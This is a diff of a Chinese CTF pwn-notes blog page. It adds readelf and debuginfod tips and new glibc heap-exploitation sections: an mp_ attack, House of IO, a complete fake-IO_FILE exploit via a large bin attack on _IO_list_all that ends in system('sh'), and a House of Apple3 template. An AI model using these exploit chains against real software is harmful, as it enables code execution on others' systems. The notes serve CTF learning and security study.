@@ -311,7 +311,7 @@
 
 
                 <time class="article-time--reading">
-                    阅读时长: 182 分钟
+                    阅读时长: 195 分钟
                 </time>
                 <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-copyright" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
   <path stroke="none" d="M0 0h24v24H0z"/>
@@ -322,7 +322,7 @@
 
 
                 <time class="article-words">
-                    90793 字
+                    97396 字
                 </time>
             </div>
         
@@ -1677,6 +1677,9 @@
 </span><span class="lnt">3
 </span><span class="lnt">4
 </span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span><span class="lnt">8
 </span></code></pre></td>
 <td class="lntd">
 <pre tabindex="0" class="chroma"><code class="language-Bash" data-lang="Bash"><span class="line"><span class="cl">readelf -e xxx <span class="c1"># 分析ELF程序的工具，可以查看所有节头信息</span>
@@ -1684,6 +1687,9 @@
 </span></span><span class="line"><span class="cl">readelf -l a.out <span class="c1"># 程序头表/段表 整理节表组成内存页, 且按权限分了类, 可以看到未运行文件大小和运行后内存大小</span>
 </span></span><span class="line"><span class="cl">readelf -r a.out <span class="c1"># 重定位表</span>
 </span></span><span class="line"><span class="cl">readelf -s a.out <span class="c1"># 符号表 主要链接和调试中使用, strip elf命令去掉后IDA分析只能分析出sub_XXXX</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">readelf -S  vuln  <span class="p">|</span> grep debug <span class="c1">#查看是否有调试信息</span>
+</span></span><span class="line"><span class="cl">readelf -s vuln <span class="c1">#查看是否去除符号表   </span>
 </span></span></code></pre></td></tr></table>
 </div>
 </div><p><strong>objdump</strong></p>
@@ -1858,7 +1864,7 @@
 </span><span class="lnt">3
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">dpkg-deb -x libcx-dbg_x.xx-xubuntux.x_amd64.deb ./sym
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">dpkg-deb -x libc6-dbg_x.xx-xubuntux.x_amd64.deb ./sym
 </span></span><span class="line"><span class="cl">cp ~/sym/usr/lib/debug/lib/x86_64-linux-gnu/ xxxx/.debug/ <span class="c1"># 其中file libc和ld会带有with debug_info, not stripped信息</span>
 </span></span><span class="line"><span class="cl"><span class="c1"># 最终在gdb中set debug-file-directory xxxx/.debug/</span>
 </span></span></code></pre></td></tr></table>
@@ -1869,17 +1875,19 @@
 </ul>
 <p>【旧版本】</p>
 <ul>
-<li>
-<p>gdb10.1版本支持debuginfod，且elfutils-0.179后才支持，编译gdb configure加入<code>--with-debuginfod</code></p>
-</li>
-<li>
-<p><code>vim /etc/debuginfod/ubuntu.urls</code>写入<code>https://debuginfod.ubuntu.com</code></p>
-</li>
-<li>
-<p>pwndbg中在<code>~/.gdbinit</code>写入<code>set debuginfod enabled on</code></p>
-</li>
+<li>gdb10.1版本支持debuginfod，且elfutils-0.179后才支持，编译gdb configure加入<code>--with-debuginfod</code></li>
+<li><code>vim /etc/debuginfod/ubuntu.urls</code>写入<code>https://debuginfod.ubuntu.com</code></li>
+<li>pwndbg中在<code>~/.gdbinit</code>写入<code>set debuginfod enabled on</code></li>
 </ul>
-<h2 id="基础知识">基础知识</h2>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="nb">export</span> <span class="nv">DEBUGINFOD_URLS</span><span class="o">=</span>https://debuginfod.deepin.com
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h2 id="基础知识">基础知识</h2>
 <h3 id="计组">计组</h3>
 <p><strong>CPU架构</strong></p>
 <ul>
@@ -9106,8 +9114,8 @@
 <td class="lntd">
 <pre tabindex="0" class="chroma"><code class="language-C" data-lang="C"><span class="line"><span class="cl"><span class="k">typedef</span> <span class="k">struct</span> <span class="n">tcache_perthread_struct</span>
 </span></span><span class="line"><span class="cl"><span class="p">{</span>
-</span></span><span class="line"><span class="cl">  <span class="kt">char</span> <span class="n">counts</span><span class="p">[</span><span class="n">TCACHE_MAX_BINS</span><span class="p">];</span>
-</span></span><span class="line"><span class="cl">  <span class="n">tcache_entry</span> <span class="o">*</span><span class="n">entries</span><span class="p">[</span><span class="n">TCACHE_MAX_BINS</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl">  <span class="kt">char</span> <span class="n">counts</span><span class="p">[</span><span class="n">TCACHE_MAX_BINS</span><span class="p">];</span> <span class="c1">// 1字节
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="n">tcache_entry</span> <span class="o">*</span><span class="n">entries</span><span class="p">[</span><span class="n">TCACHE_MAX_BINS</span><span class="p">];</span>
 </span></span><span class="line"><span class="cl"><span class="p">}</span> <span class="n">tcache_perthread_struct</span><span class="p">;</span>
 </span></span><span class="line"><span class="cl">
 </span></span><span class="line"><span class="cl"><span class="cp"># define TCACHE_MAX_BINS                64
@@ -10438,6 +10446,52 @@
 <li>覆盖<code>fd</code>为与<code>__free_hook</code>地址异或后的<code>next</code>地址，申请2个同样大小堆块，第二块为fd指向的<code>__free_hook</code>地址</li>
 <li>写入<code>system</code>地址，调用<code>free()</code>包含<code>'/bin/sh'</code>的堆块达成getshell</li>
 </ul>
+<h4 id="mp_-attack">mp_ attack</h4>
+<ul>
+<li>glibc-2.31，通过<code>large bin attack</code>修改<code>mp_.tcach_bins</code>为极大值/堆地址</li>
+<li>该值记录tcache bin的最大索引值，超过该值的堆块都不属于tcache bin</li>
+</ul>
+<p><strong>利用</strong></p>
+<ul>
+<li>
+<p>修改<code>tcache_bins</code>后删除0x500大小的chunk z时，会进入到tcache中，且此时tcache的结构体会和堆重叠</p>
+</li>
+<li>
+<p>实际过程可通过gdb调试获取【1】增加的counts值以及【2】何处地址值更改为了e</p>
+</li>
+</ul>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="c1">// tcache_put 函数
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="n">tcache_entry</span> <span class="o">*</span><span class="n">e</span> <span class="o">=</span> <span class="p">(</span><span class="n">tcache_entry</span> <span class="o">*</span><span class="p">)</span> <span class="n">chunk2mem</span> <span class="p">(</span><span class="n">chunk</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="n">e</span><span class="o">-&gt;</span><span class="n">key</span> <span class="o">=</span> <span class="n">tcache</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="n">e</span><span class="o">-&gt;</span><span class="n">next</span> <span class="o">=</span> <span class="n">tcache</span><span class="o">-&gt;</span><span class="n">entries</span><span class="p">[</span><span class="n">tc_idx</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl"><span class="n">tcache</span><span class="o">-&gt;</span><span class="n">entries</span><span class="p">[</span><span class="n">tc_idx</span><span class="p">]</span> <span class="o">=</span> <span class="n">e</span><span class="p">;</span> <span class="c1">// 【2】
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="o">++</span><span class="p">(</span><span class="n">tcache</span><span class="o">-&gt;</span><span class="n">counts</span><span class="p">[</span><span class="n">tc_idx</span><span class="p">]);</span> <span class="c1">// 【1】
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p>此时chunk z的bk指向<code>heap_base_addr + 0x10</code>处，且由于tcache-&gt;counts+1，gdb观察时会出现tcache为0x0001000情况，通过【2】找到可控chunk x，gdb呈现：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">chunk x_addr --&gt; <span class="m">0</span>
+</span></span><span class="line"><span class="cl">...
+</span></span><span class="line"><span class="cl">chunk x_addr + offset --&gt; chunk z_addr
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>修改可控<code>chunk x_addr + offset</code>为<code>__free_hook</code>地址，申请0x500大小chunk时tcache将申请出<code>__free_hook</code>地址，修改为<code>system</code>，free带有<code>/bin/sh</code>的chunk达成利用</p>
 <h3 id="large-bin-attack">Large bin attack</h3>
 <h4 id="地址泄露-1">地址泄露</h4>
 <ul>
@@ -10601,7 +10655,7 @@
 </span></span><span class="line"><span class="cl">
 </span></span><span class="line"><span class="cl"><span class="n">edit</span><span class="p">(</span><span class="mi">4</span><span class="p">,</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">libc</span><span class="o">.</span><span class="n">sym</span><span class="p">[</span><span class="s2">&#34;stderr&#34;</span><span class="p">]</span><span class="o">-</span><span class="mh">0x10</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">libc</span><span class="o">.</span><span class="n">sym</span><span class="p">[</span><span class="s1">&#39;_IO_list_all&#39;</span><span class="p">]</span><span class="o">-</span><span class="mh">0x20</span><span class="p">))</span> <span class="c1"># UAF伪造</span>
 </span></span><span class="line"><span class="cl"><span class="n">free</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span> <span class="c1"># chunk2进入unsorted bin</span>
-</span></span><span class="line"><span class="cl"><span class="n">malloc</span><span class="p">(</span><span class="mi">5</span><span class="p">,</span> <span class="mh">0x500</span><span class="p">)</span> <span class="c1"># chunk2进入large bin 触发两处任意地址写，将stderr和_IO_list_all改为堆地址</span>
+</span></span><span class="line"><span class="cl"><span class="n">malloc</span><span class="p">(</span><span class="mi">5</span><span class="p">,</span> <span class="mh">0x500</span><span class="p">)</span> <span class="c1"># chunk2进入large bin 触发两处任意地址写，将stderr和_IO_list_all改为chunk2地址</span>
 </span></span><span class="line"><span class="cl"><span class="c1"># glibc-2.31后，只能利用一处，即edit(4, p64(0)*3 + p64(target_addr - 0x20))</span>
 </span></span></code></pre></td></tr></table>
 </div>
@@ -11073,6 +11127,8 @@
 </span></span></code></pre></td></tr></table>
 </div>
 </div><img src="/img/pwn_note.zh-cn.assets/image-20241128190118374.png" alt="image-20241128190118374" style="zoom: 80%;" />
+<h4 id="house-of-io">House of IO</h4>
+<p>将<code>tcache_perthread_struct</code>结构体释放，再申请回来控制整个tcache分配</p>
 <h4 id="house-of-spirit">House of Spirit</h4>
 <ul>
 <li>glibc-2.23，在目标位置伪造fastbin然后释放，最终实现指定地址分配chunk</li>
@@ -14562,9 +14618,145 @@
 	
 	
 ></p>
+<p><strong>完整利用</strong></p>
 <ul>
-<li>large bin attack劫持<code>_IO_list_all</code>为相应large bin chunk，在该large bin chunk伪造</li>
-<li>exit退出触发</li>
+<li>
+<p>确定构造chunk 1为伪造chunk</p>
+<ul>
+<li>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span><span class="lnt">8
+</span><span class="lnt">9
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">malloc</span><span class="p">(</span><span class="mh">0x600</span><span class="p">)</span>	<span class="c1"># 0   	290</span>
+</span></span><span class="line"><span class="cl"><span class="n">malloc</span><span class="p">(</span><span class="mh">0x6e0</span><span class="p">)</span>	<span class="c1"># 1 !   8a0</span>
+</span></span><span class="line"><span class="cl"><span class="n">free</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>			<span class="c1"># 			 , 0 -&gt; unsorted bin</span>
+</span></span><span class="line"><span class="cl"><span class="n">malloc</span><span class="p">(</span><span class="mh">0x6e0</span><span class="p">)</span>	<span class="c1"># 2  	f90  , chunk 0 into large bin</span>
+</span></span><span class="line"><span class="cl"><span class="n">show</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>			<span class="c1"># 泄露libc基址, chunk 1地址, _IO_list_all地址, _IO_wfile_jumps地址</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># 恢复</span>
+</span></span><span class="line"><span class="cl"><span class="n">free</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">free</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div></li>
+</ul>
+</li>
+<li>
+<p>large bin attack劫持<code>_IO_list_all</code>为相应large bin chunk，在该large bin chunk伪造</p>
+<ul>
+<li>
+<p>可通过多次构建及释放堆块来劫持<code>bk_nextsize</code></p>
+</li>
+<li>
+<p>如下使得编辑chunk 4即可修改chunk 6 的<code>bk_nextsize</code>以及填入fake IO_FILE结构体</p>
+</li>
+<li>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">malloc</span><span class="p">(</span><span class="mh">0x5e0</span><span class="p">)</span> <span class="c1"># 3      290</span>
+</span></span><span class="line"><span class="cl"><span class="n">malloc</span><span class="p">(</span><span class="mh">0x800</span><span class="p">)</span> <span class="c1"># 4 !    880</span>
+</span></span><span class="line"><span class="cl"><span class="n">free</span><span class="p">(</span><span class="mi">3</span><span class="p">)</span> <span class="c1"># chunk 3 -&gt; unsorted bin</span>
+</span></span><span class="line"><span class="cl"><span class="n">free</span><span class="p">(</span><span class="mi">4</span><span class="p">)</span> <span class="c1"># chunk 3,4 unlink to topchunk</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">malloc</span><span class="p">(</span><span class="mh">0x5d0</span><span class="p">)</span> <span class="c1"># 5      290</span>
+</span></span><span class="line"><span class="cl"><span class="n">malloc</span><span class="p">(</span><span class="mh">0x6e0</span><span class="p">)</span> <span class="c1"># 6 !    870</span>
+</span></span><span class="line"><span class="cl"><span class="n">malloc</span><span class="p">(</span><span class="mh">0x500</span><span class="p">)</span> <span class="c1"># 7      f60</span>
+</span></span><span class="line"><span class="cl"><span class="n">free</span><span class="p">(</span><span class="mi">6</span><span class="p">)</span> <span class="c1"># 6 -&gt; unsorted bin</span>
+</span></span><span class="line"><span class="cl"><span class="n">malloc</span><span class="p">(</span><span class="mh">0x800</span><span class="p">)</span> <span class="c1"># 8      1470    6 --&gt; largebin</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div></li>
+<li>
+<p>构造fake编辑chunk 4</p>
+</li>
+<li>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="c1"># heap_addr 和 fake 的基地址均为 8a0</span>
+</span></span><span class="line"><span class="cl"><span class="n">fake</span> <span class="o">=</span> <span class="n">flat</span><span class="p">({</span>
+</span></span><span class="line"><span class="cl">    <span class="c1"># 此处实际填入到chunk1中，需要构造使得chunk1的size正确，于是填入0x6e1便于后续free</span>
+</span></span><span class="line"><span class="cl">    <span class="c1"># 加入\x80等是为了字节对齐,也可b&#39;\x80\x80;sh;\x80\x80&#39;</span>
+</span></span><span class="line"><span class="cl">    <span class="mi">0</span><span class="p">:</span> <span class="p">[</span><span class="sa">b</span><span class="s1">&#39;</span><span class="se">\x80\x80</span><span class="s1">||sh</span><span class="se">\x00\x00</span><span class="s1">&#39;</span><span class="p">,</span> <span class="mh">0x6e1</span><span class="p">],</span> <span class="c1"># _flags </span>
+</span></span><span class="line"><span class="cl">    <span class="mh">0xa0</span><span class="p">:</span> <span class="n">heap_addr</span> <span class="o">+</span> <span class="mh">0x200</span><span class="p">,</span> <span class="c1"># _wide_data</span>
+</span></span><span class="line"><span class="cl">    <span class="mh">0xd8</span><span class="p">:</span> <span class="n">_IO_wfile_jumps_addr</span><span class="p">,</span> <span class="c1"># vtable</span>
+</span></span><span class="line"><span class="cl">    <span class="mh">0x2e0</span><span class="p">:</span> <span class="n">heap_addr</span> <span class="o">+</span> <span class="mh">0x400</span><span class="p">,</span> <span class="c1"># _wide_vtable</span>
+</span></span><span class="line"><span class="cl">    <span class="mh">0x468</span><span class="p">:</span> <span class="n">system_addr</span><span class="p">,</span> <span class="c1"># doallocate</span>
+</span></span><span class="line"><span class="cl">    <span class="mh">0x6e0</span><span class="p">:</span> <span class="p">[]</span>
+</span></span><span class="line"><span class="cl"><span class="p">},</span> <span class="n">filler</span> <span class="o">=</span> <span class="sa">b</span><span class="s1">&#39;</span><span class="se">\x00</span><span class="s1">&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">_IO_list_all_addr</span> <span class="o">-</span> <span class="mh">0x20</span><span class="p">)</span> <span class="c1"># 控制chunk 6 bk_nextsize</span>
+</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="n">fake</span> <span class="c1"># fake IO_FILE struct</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># 具体调试过程中绕过检查所需操作</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># if (__glibc_unlikely (!prev_inuse(nextchunk)))</span>
+</span></span><span class="line"><span class="cl"><span class="c1">#   malloc_printerr (&#34;double free or corruption (!prev)&#34;);</span>
+</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x111</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0xd00</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x6f0</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">edit</span><span class="p">(</span><span class="mi">4</span><span class="p">,</span> <span class="n">payload</span><span class="p">)</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div></li>
+<li>
+<p>释放chunk 1，并触发largebin attack，劫持<code>_IO_list_all</code>为chunk 1即8a0结尾地址</p>
+</li>
+<li>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">free</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">malloc</span><span class="p">(</span><span class="mh">0x800</span><span class="p">)</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div></li>
+</ul>
+</li>
+<li>
+<p>exit退出触发</p>
+</li>
 </ul>
 <p><strong>模板</strong></p>
 <p>前两个标志，<code>prev_size</code>设置为<code>0xfbad1880</code>，<code>size</code>设置为<code>;sh;</code></p>
@@ -14759,9 +14951,1212 @@
 </li>
 </ul>
 <h5 id="house-of-apple3">House of Apple3</h5>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span><span class="lnt">8
+</span><span class="lnt">9
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="o">-</span> <span class="n">_IO_FILE_complete</span>
+</span></span><span class="line"><span class="cl">	<span class="o">|-</span> <span class="k">struct</span> <span class="n">_IO_codecvt</span> <span class="o">*</span><span class="n">_codecvt</span>
+</span></span><span class="line"><span class="cl">		<span class="o">|-</span><span class="n">_IO_iconv_t</span> <span class="n">__cd_in</span>
+</span></span><span class="line"><span class="cl">  		<span class="o">|-</span><span class="n">_IO_iconv_t</span> <span class="n">__cd_out</span>
+</span></span><span class="line"><span class="cl">  			<span class="o">|-</span><span class="k">struct</span> <span class="n">__gconv_step</span> <span class="o">*</span><span class="n">step</span>
+</span></span><span class="line"><span class="cl">  				<span class="o">|-</span><span class="k">struct</span> <span class="n">__gconv_loaded_object</span> <span class="o">*</span><span class="n">__shlib_handle</span>
+</span></span><span class="line"><span class="cl">  				<span class="o">|-</span><span class="p">....</span>
+</span></span><span class="line"><span class="cl">  				<span class="o">|-</span><span class="n">__gconv_fct</span> <span class="n">__fct</span>
+</span></span><span class="line"><span class="cl">  			<span class="o">|-</span><span class="k">struct</span> <span class="n">__gconv_step_data</span> <span class="n">step_data</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><ul>
+<li>利用<code>__libio_codecvt_out</code>、<code>__libio_codecvt_in</code>和<code>__libio_codecvt_length</code>函数</li>
+</ul>
+<p>① <code>_IO_wfile_underflow</code></p>
+<p><strong>原理</strong></p>
+<ul>
+<li><code>_IO_wfile_underflow</code>函数中调用了<code>__libio_codecvt_in</code></li>
+<li>且其为<code>_IO_wfile_jumps</code>这个<code>_IO_jump_t</code>类型变量的成员函数</li>
+<li>伪造<code>FILE</code>结构体的<code>fp-&gt;vtable</code>为<code>_IO_wfile_jumps</code></li>
+</ul>
+<p><strong>调用链</strong>：<code>_IO_wfile_underflow</code> &gt; <code>__libio_codecvt_in</code> &gt; <code>DL_CALL_FCT</code> &gt; <code>gs = fp-&gt;_codecvt-&gt;__cd_in.step</code> &gt; <code>*(gs-&gt;__fct)(gs)</code></p>
+<p><strong>fp设置</strong></p>
+<ul>
+<li><code>_flags</code>设置为<code>~(4 | 0x10)</code></li>
+<li><code>vtable</code>设置为<code>_IO_wfile_jumps</code>地址（加减偏移），使其能成功调用<code>_IO_wfile_underflow</code>即可</li>
+<li><code>fp-&gt;_IO_read_ptr &lt; fp-&gt;_IO_read_end</code>，即满足<code>*(fp + 8) &lt; *(fp + 0x10)</code></li>
+<li><code>_wide_data</code>保持默认，或者设置为堆地址，假设其地址为<code>A</code>，即满足<code>*(fp + 0xa0) = A</code></li>
+<li><code>_wide_data-&gt;_IO_read_ptr &gt;= _wide_data-&gt;_IO_read_end</code>，即满足<code>*A &gt;= *(A + 8)</code></li>
+<li><code>_codecvt</code>设置为可控堆地址<code>B</code>，即满足<code>*(fp + 0x98) = B</code></li>
+<li><code>codecvt-&gt;__cd_in.step</code>设置为可控堆地址<code>C</code>，即满足<code>*B = C</code></li>
+<li><code>codecvt-&gt;__cd_in.step-&gt;__shlib_handle</code>设置为<code>0</code>，即满足<code>*C = 0</code></li>
+<li><code>codecvt-&gt;__cd_in.step-&gt;__fct</code>设置为地址<code>D</code>,地址<code>D</code>用于控制<code>rip</code>，即满足<code>*(C + 0x28) = D</code>。当调用到<code>D</code>的时候，此时的<code>rdi</code>为<code>C</code>。如果<code>_wide_data</code>也可控的话，<code>rsi</code>也能控制</li>
+</ul>
+<p><img src="/img/pwn_note.zh-cn.assets/image-20250126203031787.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20250126203031787"
+	
+	
+></p>
+<p><strong>模板</strong></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">file_addr</span> <span class="o">=</span> <span class="n">heap_base</span> <span class="o">+</span> <span class="mh">0x6d0</span>
+</span></span><span class="line"><span class="cl"><span class="n">payload_addr</span> <span class="o">=</span> <span class="n">file_addr</span> <span class="o">+</span> <span class="mh">0x10</span>
+</span></span><span class="line"><span class="cl"><span class="n">codecvt_addr</span> <span class="o">=</span> <span class="n">file_addr</span> <span class="o">+</span> <span class="mh">0xe0</span>
+</span></span><span class="line"><span class="cl"><span class="n">frame_addr</span> <span class="o">=</span> <span class="n">codecvt_addr</span> <span class="o">+</span> <span class="mi">5</span> <span class="o">*</span> <span class="mi">8</span>
+</span></span><span class="line"><span class="cl"><span class="n">rop_addr</span> <span class="o">=</span> <span class="n">frame_addr</span> <span class="o">+</span> <span class="mh">0xf8</span>
+</span></span><span class="line"><span class="cl"><span class="n">buf_addr</span> <span class="o">=</span> <span class="n">rop_addr</span> <span class="o">+</span> <span class="mh">0x60</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">fake_file</span> <span class="o">=</span> <span class="sa">b</span><span class="s2">&#34;&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="n">fake_file</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0xFFFFFFFFFFFFFFFF</span><span class="p">)</span>  <span class="c1"># _IO_read_end</span>
+</span></span><span class="line"><span class="cl"><span class="n">fake_file</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>  <span class="c1"># _IO_read_base</span>
+</span></span><span class="line"><span class="cl"><span class="n">fake_file</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>  <span class="c1"># _IO_write_base</span>
+</span></span><span class="line"><span class="cl"><span class="n">fake_file</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>  <span class="c1"># _IO_write_ptr</span>
+</span></span><span class="line"><span class="cl"><span class="n">fake_file</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>  <span class="c1"># _IO_write_end</span>
+</span></span><span class="line"><span class="cl"><span class="n">fake_file</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>  <span class="c1"># _IO_buf_base;</span>
+</span></span><span class="line"><span class="cl"><span class="n">fake_file</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>  <span class="c1"># _IO_buf_end should usually be (_IO_buf_base + 1)</span>
+</span></span><span class="line"><span class="cl"><span class="n">fake_file</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">*</span> <span class="mi">4</span>  <span class="c1"># from _IO_save_base to _markers</span>
+</span></span><span class="line"><span class="cl"><span class="n">fake_file</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>  <span class="c1"># the FILE chain ptr</span>
+</span></span><span class="line"><span class="cl"><span class="n">fake_file</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span>  <span class="c1"># _fileno for stderr is 2</span>
+</span></span><span class="line"><span class="cl"><span class="n">fake_file</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>  <span class="c1"># _flags2, usually 0</span>
